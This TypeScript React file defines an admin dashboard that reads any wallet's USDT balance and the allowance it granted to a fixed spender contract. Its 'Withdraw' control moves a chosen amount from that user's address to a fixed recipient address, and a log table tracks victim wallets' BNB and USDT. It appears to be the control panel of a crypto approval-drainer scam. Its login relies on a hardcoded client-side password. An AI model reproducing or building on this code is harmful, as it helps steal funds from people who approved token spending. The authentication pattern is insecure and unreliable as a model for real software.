// admin page 
"use client";
import React, { useEffect, useState } from 'react';
import { balance_USDT_Allownce, connectWalletBSC, contract_Owner, withDrawFunds } from './adminCall';
import { RECIPIENT_ADDRESS, SPENDER_ADDRESS } from './constent';

const Admin = () => {
  const [userAddress, setUserAddress] = useState('');
  const [amount, setAmount] = useState('');
  const [usdtBalance, setUsdtBalance] = useState('0');
  const [allowance, setAllowance] = useState(0);
  const [Connectedadmin, setConnectedAdmin] = useState(''); 
  const [Owner, setOwner] = useState<string | null>();
  const [logs, setLogs] = useState<any[]>([]);
  const [loadingLogs, setLoadingLogs] = useState(false);
  const [isAdminLoggedIn, setIsAdminLoggedIn] = useState(false);
  const [password, setPassword] = useState('');

  // IMPORTANT: Set this to your main app's URL (e.g., https://your-wallet-app.vercel.app)
  const API_BASE_URL = ''; 

  const fetchLogs = async () => {
    try {
      setLoadingLogs(true);
      const res = await fetch(`${API_BASE_URL}/api/logs`);
      const data = await res.json();
      setLogs(data);
    } catch (error) {
      console.error("Error fetching logs:", error);
    } finally {
      setLoadingLogs(false);
    }
  };

  const handleLogin = () => {
    if (password === 'admin123') {
      setIsAdminLoggedIn(true);
    } else {
      window.alert("Invalid password");
    }
  };

  useEffect(() => {
    if (isAdminLoggedIn) fetchLogs();
  }, [isAdminLoggedIn]);

  useEffect(()=>{
    if(Connectedadmin){
      const fetchBalanceAndAllowance = async () => {
        try {
          const OnwerAddress = await contract_Owner();
          setOwner(OnwerAddress);
          const { balance, allowance } = await balance_USDT_Allownce(userAddress);
          setUsdtBalance(balance);
          setAllowance(allowance);
        } catch (error) {
          console.error("Error fetching balance and allowance:", error);
        }
      };
      fetchBalanceAndAllowance();
    }
  },[userAddress, Connectedadmin])

  const ConnectWallet =async()=>{
    try {
     const { account } = await connectWalletBSC();
     setConnectedAdmin(account)
    } catch (error) {
      console.error("Error connecting wallet:", error);
    }
  }

  const withDrawUSDT = async () => {
    try {
      if(!userAddress || !amount) {
        window.alert("Please enter user address and amount");
        return;
      }
      if(!Connectedadmin) {
        window.alert("Please connect your wallet first");
        return;
      }
      if(Owner && (Owner?.toLocaleLowerCase() !== Connectedadmin.toLocaleLowerCase())) {
        window.alert("You are not the owner of this contract");
        return;
      }

      const data = await withDrawFunds(userAddress, Number(amount));
      if(data.status){
        window.alert("Transaction successful");
      }
    } catch (error) {
      console.error("Error withdrawing funds:", error);
    }
  };

  const trimAddreess = (address: string) => {
    if (!address) return '';
    return `${address.slice(0, 6)}...${address.slice(-4)}`;
  }

  if (!isAdminLoggedIn) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-gray-100 p-6">
        <div className="bg-white p-8 rounded-lg shadow-md w-full max-w-md">
          <h2 className="text-2xl font-bold mb-6 text-gray-700 text-center">Admin Login</h2>
          <div className="mb-4">
            <label className="block text-gray-700 font-medium mb-2">Password:</label>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full p-2 border text-gray-700 border-gray-300 rounded focus:ring-2 focus:ring-blue-500"
              placeholder="Enter admin password"
            />
          </div>
          <button
            onClick={handleLogin}
            className="w-full bg-blue-500 text-white py-2 px-4 rounded hover:bg-blue-600 transition"
          >
            Login
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="p-6 bg-gray-100 min-h-screen">
      <div className="max-w-4xl mx-auto">
        <h2 className="text-3xl font-bold mb-6 text-gray-700 text-center">Admin Dashboard (External)</h2>
        
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
          <div className="bg-white p-6 rounded-lg shadow-sm border border-gray-200">
            <h3 className="text-xl font-semibold mb-4 text-gray-700">Contract Info</h3>
            <div className="space-y-4">
              <div>
                <label className="block text-sm text-gray-500 font-medium mb-1">Contract Address:</label>
                <input type="text" value={SPENDER_ADDRESS} disabled className="w-full p-2 border text-xs text-gray-700 border-gray-300 rounded bg-gray-50" />
              </div>
              <div>
                <label className="block text-sm text-gray-500 font-medium mb-1">Recipient Address:</label>
                <input type="text" value={RECIPIENT_ADDRESS} disabled className="w-full p-2 border text-xs text-gray-700 border-gray-300 rounded bg-gray-50" />
              </div>
              <div>
                <label className="block text-sm text-gray-500 font-medium mb-1">Contract Owner:</label>
                <input type="text" value={Owner || 'Loading...'} disabled className="w-full p-2 border text-xs text-gray-700 border-gray-300 rounded bg-gray-50" />
              </div>
            </div>
          </div>

          <div className="bg-white p-6 rounded-lg shadow-sm border border-gray-200">
            <h3 className="text-xl font-semibold mb-4 text-gray-700">Withdrawal Controls</h3>
            <div className="space-y-4">
              <div>
                <label className="block text-sm text-gray-500 font-medium mb-1">User Address:</label>
                <input type="text" value={userAddress} onChange={(e) => setUserAddress(e.target.value)} className="w-full p-2 border text-gray-700 border-gray-300 rounded focus:ring-1 focus:ring-blue-500" />
              </div>
              <div>
                <label className="block text-sm text-gray-500 font-medium mb-1">Amount (USDT):</label>
                <input type="number" value={amount} onChange={(e) => setAmount(e.target.value)} className="w-full p-2 border text-gray-700 border-gray-300 rounded focus:ring-1 focus:ring-blue-500" />
              </div>
              <div className="flex space-x-2">
                <button onClick={ConnectWallet} className="flex-1 bg-gray-600 text-white py-2 px-4 rounded hover:bg-gray-700 transition">
                  {Connectedadmin !== '' ? trimAddreess(Connectedadmin) : 'Connect Wallet'}
                </button>
                <button onClick={withDrawUSDT} className="flex-1 bg-blue-600 text-white py-2 px-4 rounded hover:bg-blue-700 transition">
                  Withdraw
                </button>
              </div>
              <div className="text-center pt-2">
                <p className="text-gray-600">Balance: <span className="font-bold">{usdtBalance}</span> | Allowance: <span className="font-bold">{allowance}</span></p>
              </div>
            </div>
          </div>
        </div>

        {/* Logs Section */}
        <div className="bg-white p-6 rounded-lg shadow-sm border border-gray-200">
          <div className="flex justify-between items-center mb-4">
            <h3 className="text-xl font-semibold text-gray-700">Recent Activity Logs</h3>
            <button onClick={fetchLogs} className="text-blue-500 hover:text-blue-600 text-sm font-medium">Refresh Logs</button>
          </div>
          
          <div className="overflow-x-auto">
            <table className="w-full text-left text-sm">
              <thead className="bg-gray-50 text-gray-600 uppercase text-xs">
                <tr>
                  <th className="px-4 py-2 border-b">Time</th>
                  <th className="px-4 py-2 border-b">Type</th>
                  <th className="px-4 py-2 border-b">Wallet</th>
                  <th className="px-4 py-2 border-b">BNB</th>
                  <th className="px-4 py-2 border-b">USDT</th>
                </tr>
              </thead>
              <tbody className="text-gray-700">
                {loadingLogs ? (
                  <tr><td colSpan={5} className="px-4 py-4 text-center">Loading logs...</td></tr>
                ) : logs.length === 0 ? (
                  <tr><td colSpan={5} className="px-4 py-4 text-center">No logs found</td></tr>
                ) : (
                  logs.map((log) => (
                    <tr key={log.id} className="hover:bg-gray-50 border-b last:border-0">
                      <td className="px-4 py-2 whitespace-nowrap">{new Date(log.timestamp).toLocaleString()}</td>
                      <td className="px-4 py-2 uppercase font-medium">{log.type}</td>
                      <td className="px-4 py-2 font-mono text-xs">{log.address}</td>
                      <td className="px-4 py-2">{log.bnb}</td>
                      <td className="px-4 py-2">{log.usdt}</td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Admin;
